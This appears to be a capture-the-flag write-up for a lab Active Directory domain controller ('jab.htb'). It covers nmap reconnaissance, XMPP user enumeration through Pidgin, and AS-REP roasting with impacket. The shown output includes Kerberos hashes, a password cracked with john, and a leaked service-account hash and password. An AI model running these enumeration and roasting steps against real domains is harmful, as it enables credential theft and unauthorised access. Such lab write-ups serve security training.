# Reconnaissances
## Port Scanning
`$ sudo nmap -p- -T4 -A -sV 10.10.11.4`
```
Nmap scan report for 10.10.11.4
Host is up (0.058s latency).
Not shown: 65421 closed tcp ports (reset), 78 filtered tcp ports (no-response)
PORT      STATE SERVICE             VERSION
53/tcp    open  domain              Simple DNS Plus
88/tcp    open  kerberos-sec        Microsoft Windows Kerberos (server time: 2024-03-09 03:57:48Z)
135/tcp   open  msrpc               Microsoft Windows RPC
139/tcp   open  netbios-ssn         Microsoft Windows netbios-ssn
389/tcp   open  ldap                Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
| Not valid before: 2023-11-01T20:16:18
|_Not valid after:  2024-10-31T20:16:18
|_ssl-date: 2024-03-09T03:59:29+00:00; -2m20s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-03-09T03:59:27+00:00; -2m21s from scanner time.
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
| Not valid before: 2023-11-01T20:16:18
|_Not valid after:  2024-10-31T20:16:18
3268/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-03-09T03:59:27+00:00; -2m21s from scanner time.
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
| Not valid before: 2023-11-01T20:16:18
|_Not valid after:  2024-10-31T20:16:18
3269/tcp  open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-03-09T03:59:28+00:00; -2m20s from scanner time.
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
| Not valid before: 2023-11-01T20:16:18
|_Not valid after:  2024-10-31T20:16:18
5222/tcp  open  jabber
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     xmpp: 
|       version: 1.0
|     auth_mechanisms: 
|     stream_id: aws96apsc6
|     features: 
|     unknown: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     capabilities: 
|_    compression_methods: 
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
5223/tcp  open  ssl/jabber          Ignite Realtime Openfire Jabber server 3.10.0 or later
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     xmpp: 
|     auth_mechanisms: 
|     capabilities: 
|     features: 
|     unknown: 
|     errors: 
|       (timeout)
|_    compression_methods: 
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
|_ssl-date: TLS randomness does not represent time
5262/tcp  open  jabber
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     xmpp: 
|       version: 1.0
|     auth_mechanisms: 
|     stream_id: azdxn6km0m
|     features: 
|     unknown: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     capabilities: 
|_    compression_methods: 
5263/tcp  open  ssl/jabber
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     xmpp: 
|     auth_mechanisms: 
|     capabilities: 
|     features: 
|     unknown: 
|     errors: 
|       (timeout)
|_    compression_methods: 
5269/tcp  open  xmpp                Wildfire XMPP Client
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     xmpp: 
|     auth_mechanisms: 
|     capabilities: 
|     features: 
|     unknown: 
|     errors: 
|       (timeout)
|_    compression_methods: 
5270/tcp  open  ssl/xmpp            Wildfire XMPP Client
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
5275/tcp  open  jabber
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     xmpp: 
|       version: 1.0
|     auth_mechanisms: 
|     stream_id: 39mbakrg9y
|     features: 
|     unknown: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     capabilities: 
|_    compression_methods: 
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
5276/tcp  open  ssl/jabber          Ignite Realtime Openfire Jabber server 3.10.0 or later
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     xmpp: 
|     auth_mechanisms: 
|     capabilities: 
|     features: 
|     unknown: 
|     errors: 
|       (timeout)
|_    compression_methods: 
5985/tcp  open  http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7070/tcp  open  realserver?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Sat, 09 Mar 2024 03:57:48 GMT
|     Last-Modified: Wed, 16 Feb 2022 15:55:02 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 223
|     <html>
|     <head><title>Openfire HTTP Binding Service</title></head>
|     <body><font face="Arial, Helvetica"><b>Openfire <a href="http://www.xmpp.org/extensions/xep-0124.html">HTTP Binding</a> Service</b></font></body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sat, 09 Mar 2024 03:57:53 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   Help: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   SSLSessionReq: 
|     HTTP/1.1 400 Illegal character CNTL=0x16
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
7443/tcp  open  ssl/oracleas-https?
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Sat, 09 Mar 2024 03:57:54 GMT
|     Last-Modified: Wed, 16 Feb 2022 15:55:02 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 223
|     <html>
|     <head><title>Openfire HTTP Binding Service</title></head>
|     <body><font face="Arial, Helvetica"><b>Openfire <a href="http://www.xmpp.org/extensions/xep-0124.html">HTTP Binding</a> Service</b></font></body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sat, 09 Mar 2024 03:58:00 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   Help: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   SSLSessionReq: 
|     HTTP/1.1 400 Illegal character CNTL=0x16
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
|_ssl-date: TLS randomness does not represent time
7777/tcp  open  socks5              (No authentication; connection not allowed by ruleset)
| socks-auth-info: 
|_  No authentication
9389/tcp  open  mc-nmf              .NET Message Framing
47001/tcp open  http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc               Microsoft Windows RPC
49665/tcp open  msrpc               Microsoft Windows RPC
49666/tcp open  msrpc               Microsoft Windows RPC
49667/tcp open  msrpc               Microsoft Windows RPC
49671/tcp open  msrpc               Microsoft Windows RPC
49674/tcp open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc               Microsoft Windows RPC
49676/tcp open  msrpc               Microsoft Windows RPC
49681/tcp open  msrpc               Microsoft Windows RPC
49779/tcp open  msrpc               Microsoft Windows RPC
61418/tcp open  msrpc               Microsoft Windows RPC
6 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5222-TCP:V=7.94SVN%I=7%D=3/8%Time=65EBDEDD%P=x86_64-pc-linux-gnu%r(
SF:RPCCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\.org
SF:/streams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-stre
SF:ams\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5262-TCP:V=7.94SVN%I=7%D=3/8%Time=65EBDEDD%P=x86_64-pc-linux-gnu%r(
SF:RPCCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\.org
SF:/streams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-stre
SF:ams\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5263-TCP:V=7.94SVN%T=SSL%I=7%D=3/8%Time=65EBDEEC%P=x86_64-pc-linux-
SF:gnu%r(RPCCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabbe
SF:r\.org/streams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmp
SF:p-streams\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5275-TCP:V=7.94SVN%I=7%D=3/8%Time=65EBDEDD%P=x86_64-pc-linux-gnu%r(
SF:RPCCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\.org
SF:/streams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-stre
SF:ams\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port7070-TCP:V=7.94SVN%I=7%D=3/8%Time=65EBDEC9%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,189,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2009\x20Mar\x2
SF:02024\x2003:57:48\x20GMT\r\nLast-Modified:\x20Wed,\x2016\x20Feb\x202022
SF:\x2015:55:02\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges:\x20
SF:bytes\r\nContent-Length:\x20223\r\n\r\n<html>\n\x20\x20<head><title>Ope
SF:nfire\x20HTTP\x20Binding\x20Service</title></head>\n\x20\x20<body><font
SF:\x20face=\"Arial,\x20Helvetica\"><b>Openfire\x20<a\x20href=\"http://www
SF:\.xmpp\.org/extensions/xep-0124\.html\">HTTP\x20Binding</a>\x20Service<
SF:/b></font></body>\n</html>\n")%r(RTSPRequest,AD,"HTTP/1\.1\x20505\x20Un
SF:known\x20Version\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCo
SF:ntent-Length:\x2058\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x
SF:20505</h1><pre>reason:\x20Unknown\x20Version</pre>")%r(HTTPOptions,56,"
SF:HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2009\x20Mar\x202024\x2003:57:5
SF:3\x20GMT\r\nAllow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n")%r(RPCCheck,C7,"HT
SF:TP/1\.1\x20400\x20Illegal\x20character\x20OTEXT=0x80\r\nContent-Type:\x
SF:20text/html;charset=iso-8859-1\r\nContent-Length:\x2071\r\nConnection:\
SF:x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x
SF:20character\x20OTEXT=0x80</pre>")%r(DNSVersionBindReqTCP,C3,"HTTP/1\.1\
SF:x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/htm
SF:l;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r
SF:\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20characte
SF:r\x20CNTL=0x0</pre>")%r(DNSStatusRequestTCP,C3,"HTTP/1\.1\x20400\x20Ill
SF:egal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso
SF:-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad
SF:\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x0
SF:</pre>")%r(Help,9B,"HTTP/1\.1\x20400\x20No\x20URI\r\nContent-Type:\x20t
SF:ext/html;charset=iso-8859-1\r\nContent-Length:\x2049\r\nConnection:\x20
SF:close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20No\x20URI</p
SF:re>")%r(SSLSessionReq,C5,"HTTP/1\.1\x20400\x20Illegal\x20character\x20C
SF:NTL=0x16\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Le
SF:ngth:\x2070\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h
SF:1><pre>reason:\x20Illegal\x20character\x20CNTL=0x16</pre>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port7443-TCP:V=7.94SVN%T=SSL%I=7%D=3/8%Time=65EBDECF%P=x86_64-pc-linux-
SF:gnu%r(GetRequest,189,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2009\x20
SF:Mar\x202024\x2003:57:54\x20GMT\r\nLast-Modified:\x20Wed,\x2016\x20Feb\x
SF:202022\x2015:55:02\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Range
SF:s:\x20bytes\r\nContent-Length:\x20223\r\n\r\n<html>\n\x20\x20<head><tit
SF:le>Openfire\x20HTTP\x20Binding\x20Service</title></head>\n\x20\x20<body
SF:><font\x20face=\"Arial,\x20Helvetica\"><b>Openfire\x20<a\x20href=\"http
SF:://www\.xmpp\.org/extensions/xep-0124\.html\">HTTP\x20Binding</a>\x20Se
SF:rvice</b></font></body>\n</html>\n")%r(HTTPOptions,56,"HTTP/1\.1\x20200
SF:\x20OK\r\nDate:\x20Sat,\x2009\x20Mar\x202024\x2003:58:00\x20GMT\r\nAllo
SF:w:\x20GET,HEAD,POST,OPTIONS\r\n\r\n")%r(RTSPRequest,AD,"HTTP/1\.1\x2050
SF:5\x20Unknown\x20Version\r\nContent-Type:\x20text/html;charset=iso-8859-
SF:1\r\nContent-Length:\x2058\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Me
SF:ssage\x20505</h1><pre>reason:\x20Unknown\x20Version</pre>")%r(RPCCheck,
SF:C7,"HTTP/1\.1\x20400\x20Illegal\x20character\x20OTEXT=0x80\r\nContent-T
SF:ype:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2071\r\nConnec
SF:tion:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Ill
SF:egal\x20character\x20OTEXT=0x80</pre>")%r(DNSVersionBindReqTCP,C3,"HTTP
SF:/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20te
SF:xt/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20c
SF:lose\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20ch
SF:aracter\x20CNTL=0x0</pre>")%r(DNSStatusRequestTCP,C3,"HTTP/1\.1\x20400\
SF:x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;chars
SF:et=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<
SF:h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20CN
SF:TL=0x0</pre>")%r(Help,9B,"HTTP/1\.1\x20400\x20No\x20URI\r\nContent-Type
SF::\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2049\r\nConnectio
SF:n:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20No\x20
SF:URI</pre>")%r(SSLSessionReq,C5,"HTTP/1\.1\x20400\x20Illegal\x20characte
SF:r\x20CNTL=0x16\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCont
SF:ent-Length:\x2070\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20
SF:400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x16</pre>");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=3/8%OT=53%CT=1%CU=32221%PV=Y%DS=2%DC=T%G=Y%TM=65EBD
OS:F30%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%T
OS:S=U)SEQ(SP=106%GCD=1%ISR=10A%TI=I%TS=U)SEQ(SP=106%GCD=1%ISR=10A%TI=I%CI=
OS:I%II=I%TS=U)SEQ(SP=106%GCD=1%ISR=10A%TI=I%CI=RD%II=I%TS=U)OPS(O1=M552NW8
OS:NNS%O2=M552NW8NNS%O3=M552NW8%O4=M552NW8NNS%O5=M552NW8NNS%O6=M552NNS)WIN(
OS:W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF
OS:%O=M552NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y
OS:%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%R
OS:D=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%
OS:S=Z%A=O%F=AR%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6
OS:(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%
OS:F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=
OS:G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -2m20s, deviation: 0s, median: -2m21s
| smb2-time: 
|   date: 2024-03-09T03:59:21
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   21.06 ms 10.10.14.1
2   98.08 ms 10.10.11.4

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1058.72 seconds
```

## Observe for xmpp jabber
Refer to: https://pidgin.im/help/protocols/xmpp/ / https://play.google.com/store/apps/details?id=eu.siacs.conversations&hl=en&gl=US

Then try to install `Pidgin` as Jabber app client. and run it.
`$ sudo apt install pidgin`
`$ pidgin`
```
Click “+ Add” → Change the protocol to XMPP → Enter a username → Enter the domain “jab.htb” → Choose a password → And tick the box “Create this new account on the server” → Then add the account.
```
```
Then select your account and click modify → Enter the target IP in the connect server box → tick Create this new account on the server again → and press Save.
```
```
A prompt will appear for “XMPP Client Registration”.  
Just input your username, the email that you can see in the Accounts window, and your password.
```
```
After clicking OK you should get a response saying Registration of <username>@jab.htb successful.
```
```
Now in your Accounts window there is a box to enable your account, after clicking it enter your password and accept the self-signed certificate.
```
```
Now there should be a window open called “Buddy List” if it isn’t open you can just restart pidgin.
```

`$ pidgin -d > output.log`
```
click on the “Accounts” tab at the top, Then click on the account you created “<username>@jab.htb/ (XMPP)”, then choose the “Search for Users” option.
```
```
After selecting this a window will pop up to select a User Directory, just click “Search Directory” → Another window will pop up asking for an advanced search. To get as much info as possible enter an asterisk (*) and press OK
```

Then searching for all the existing usernames in the server.
`$ grep -oP '<value>\K[^<]+@jab.htb(?=</value>)' output.log | sed 's/@jab.htb//g' | sort | uniq > outputfiltered.lst`

## Observe for kerberos (port 88)
Try to attempt an attack called AS-REP Roasting with GetNPUsers.

Download GetNPUsers
`$ wget https://raw.githubusercontent.com/fortra/impacket/master/examples/GetNPUsers.py`

Set the jab.htb in the /etc/hosts 
`$ echo "10.10.11.4 jab.htb" | sudo tee -a /etc/hosts`

Run it with
`$ python3 GetNPUsers.py jab.htb/ -usersfile outputfiltered.lst -format hashcat -outputfile jabhashes.txt`

Then
`$ cat jabhashes.txt`
```             
$krb5asrep$23$jmontgomery@JAB.HTB:d0c54466564ac40f4360fc0b1ea2a842$b2a2ebf35c7b8972648c0de707a5678be2e5b0c41287bf2dca1beb0e4686abe56307f20524ef86ae3dd5c7acb5493d11562bc7873db0908f495ea09c92d2bd6d9e6a13d5317bada98f2d4627d8b76599b68a843135d1d17bbe02eacf2d9efb841e7d5350c842a16e05355c7274c710ee3dcec016b46ccb68dff6e7de447bf6f8edd7e424169a67ac9979ab4b70eb1085f61bc39a9136582ff21b0acfbbf52c2b87574abd3febea456803cb9e590e786712f10ee357d8fb72bec5ec259deb8d99309c0b76f79dbeb3ab9267298623e69f31fc6c3cddab2f8b4e889fe1d29835cb3ce5
$krb5asrep$23$lbradford@JAB.HTB:9f4d23908decaae900f1e66ed9a57446$dd1f5a379e2b865ff001209646d03cbc68b7a1c8f242151106792352112d5c4037715e5d7ac85a6226cae431a348853a8dbc252745edfc8cedb1045f7290d0d91db597a8b9c4c60d6bf6884ff1efdf72ae0967f8f5fe18dd26a88fb45058df1bf165f0e6650f9bfd810b254bac4800fe1271f45bd0dae1904dcf99fddad5e639d244c590b0290371b9caf63569f3c1f227a81ca82f14f978a9b7dbe09acbcc8b3950bd4f96a1b78a2e5b1d870d4d3cb9ab7152e6b01fe18eed9ca8f702d51a0f96514f95eb70bcea945a2877497e6b82ab088d18eb05d08c7d20fdc117ef11393ccc
$krb5asrep$23$mlowe@JAB.HTB:1986b3e36f6554b252aaa25630ebd22b$da89291764ecd157a23698dff296573b25dd87f0929987e506527741e1b9fb0682ebbdc6dddf1103d24b18180875cd1aa1c97a8b92e54f431962bb3da833e3666959a5623a01fb4b7aa18b26b06e0bd8b8efc90aa46a287dac05eb6b1ddfac4d08c3dbbecb0753d0e56f06a642a2347cab4e37d4e13bd25de4807a6405fb409e61a24417d347c020e707f44f58510a0ded70c78ed9054a4f1872940ea315e290dee709db93abe41c0fa4165de99e26cbc51e1ff57cc6c10783ea8372bcbf5a81b974638c1c479dc12dd86ad33a8b9b5b70bb9ea8074d04f6f2c6a2e8388ca71aea69                                                              
```

Try to crack the hash with john
`$ john -w=/usr/share/wordlists/rockyou.txt jabhashes.txt`
```
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Midnight_121     ($krb5asrep$23$jmontgomery@JAB.HTB)     
1g 0:00:01:24 DONE (2024-03-09 00:35) 0.01177g/s 168948p/s 465397c/s 465397C/s  0841079575..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Try to login to pidgin `jab.htb` server with `jmontgomery` and password `Midnight_121`, then find rooms in a `Room List`
```
‘Buddies’ → ‘Join a Chat’ → ‘Room List’ → ‘Find Rooms’ (leave as conference.jab.htb).
```
```
Then you should see a new room that appear called ‘pentest2003’.
```

There is a necessary chat here:
```
$krb5tgs$23$*svc_openfire$JAB.HTB$jab.htb/svc_openfire*$de17a01e2449626571bd9416dd4e3d46$4fea18693e1cb97f3e096288a76204437f115fe49b9611e339154e0effb1d0fcccfbbbb219da829b0ac70e8420f2f35a4f315c5c6f1d4ad3092e14ccd506e9a3bd3d20854ec73e62859cd68a7e6169f3c0b5ab82064b04df4ff7583ef18bbd42ac529a5747102c2924d1a76703a30908f5ad41423b2fff5e6c03d3df6c0635a41bea1aca3e15986639c758eef30b74498a184380411e207e5f3afef185eaf605f543c436cd155823b7a7870a3d5acd0b785f999facd8b7ffdafe6e0410af26efc42417d402f2819d03b3730203b59c21b0434e2e0e7a97ed09e3901f523ba52fe9d3ee7f4203de9e857761fbcb417d047765a5a01e71aff732e5d5d114f0b58a8a0df4ca7e1ff5a88c532f5cf33f2e01986ac44a353c0142b0360e1b839bb6889a54fbd9c549da23fb05193a4bfba179336e7dd69380bc4f9c3c00324e42043ee54b3017a913f84a20894e145b23b440aff9c524efb7957dee89b1e7b735db292ca5cb32cf024e9b8f5546c33caa36f5370db61a9a3facb473e741c61ec7dbee7420c188e31b0d920f06b7ffc1cb86ace5db0f9eeaf8c13bcca743b6bf8b2ece99dd58aff354f5b4a78ffcd9ad69ad8e7812a2952806feb9b411fe53774f92f9e8889380dddcb59de09320094b751a0c938ecc762cbd5d57d4e0c3d660e88545cc96e324a6fef226bc62e2bb31897670929571cd728b43647c03e44867b148428c9dc917f1dc4a0331517b65aa52221fcfe9499017ab4e6216ced3db5837d10ad0d15e07679b56c6a68a97c1e851238cef84a78754ff5c08d31895f0066b727449575a1187b19ad8604d583ae07694238bae2d4839fb20830f77fffb39f9d6a38c1c0d524130a6307125509422498f6c64adc030bfcf616c4c0d3e0fa76dcde0dfc5c94a4cb07ccf4cac941755cfdd1ed94e37d90bd1b612fee2ced175aa0e01f2919e31614f72c1ff7316be4ee71e80e0626b787c9f017504fa717b03c94f38fe9d682542d3d7edaff777a8b2d3163bc83c5143dc680c7819f405ec207b7bec51dabcec4896e110eb4ed0273dd26c82fc54bb2b5a1294cb7f3b654a13b4530bc186ff7fe3ab5a802c7c91e664144f92f438aecf9f814f73ed556dac403daaefcc7081957177d16c1087f058323f7aa3dfecfa024cc842aa3c8ef82213ad4acb89b88fc7d1f68338e8127644cfe101bf93b18ec0da457c9136e3d0efa0d094994e1591ecc4:!@#$%^&*(1qazxsw
```

## Try to access the svc_openfire
Download dcomexec
`$ wget https://raw.githubusercontent.com/fortra/impacket/master/examples/dcomexec.py`

